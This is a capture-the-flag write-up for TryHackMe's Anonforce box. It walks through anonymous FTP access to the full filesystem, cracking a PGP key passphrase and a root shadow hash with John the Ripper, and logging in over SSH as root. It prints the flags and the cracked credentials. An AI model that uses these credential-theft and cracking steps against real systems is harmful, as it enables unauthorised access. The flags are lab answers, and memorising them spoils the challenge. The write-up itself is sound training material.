# TryHackMe — Anonforce (Boot2Root / FIT & BSides Guatemala CTF)

## Overview
Full box compromise: anonymous FTP exposing the entire filesystem → user flag grabbed directly → PGP-encrypted shadow file backup in a world-writable directory → cracked PGP key passphrase → decrypted shadow file → cracked root password → SSH as root.

## Recon

### Nmap
```
nmap -sS -T4 --open -Pn -p- --min-rate 1000 <target-ip>
nmap -sS -T4 --open -Pn -sV -sC -p 21,22 <target-ip>
```

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.3 |
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

Key finding: **anonymous FTP login allowed**, serving the **entire filesystem root** (not a chroot jail).

## User Flag — Anonymous FTP

Connected with anonymous login and switched to passive mode (active mode fails through the VPN):
```
ftp <target-ip>
# login: anonymous / (no password)
passive
```

Browsed to the only home directory:
```
cd /home/melodias
get user.txt
```

**user.txt:** `606083fd33beb1284fc51f411a706af8`

## Privilege Escalation — PGP Encrypted Shadow Backup

### Discovery

The FTP listing showed a world-writable directory `notread` (owned by uid 1000 / `melodias`) containing:
```
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
```

Downloaded both files via FTP.

### Cracking the PGP key passphrase

Converted the private key to a John-crackable hash and ran it against rockyou:
```
gpg2john private.asc > pgp.hash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pgp.hash
```

**Passphrase: `xbox360`**

### Decrypting the backup

Imported the private key and decrypted:
```
gpg --import private.asc       # enter passphrase: xbox360
gpg --decrypt backup.pgp
```

Output was the full `/etc/shadow` file, containing the root password hash:
```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
```

### Cracking the root hash

```
echo 'root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root.hash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt root.hash
```

**Root password: `hikari`**

### Root access

```
ssh root@<target-ip>
# password: hikari
cat /root/root.txt
```

**root.txt:** `f706456440c7af4187810c31c6cebdce`

## Key Takeaways

- Anonymous FTP serving the full filesystem (no chroot) is an immediate goldmine — check for sensitive files before looking for exploits.
- FTP active mode often fails through VPN tunnels — switch to `passive` early.
- World-writable directories with suggestive names (`notread`) are intentional breadcrumbs — always check them.
- PGP private keys can be cracked with `gpg2john` + a wordlist, just like SSH keys with `ssh2john`.
- An encrypted backup of `/etc/shadow` is as good as having root if the PGP passphrase and root password are both weak.
- No exploit or shell needed here — the entire escalation path was credential recovery through misconfiguration and weak passwords.
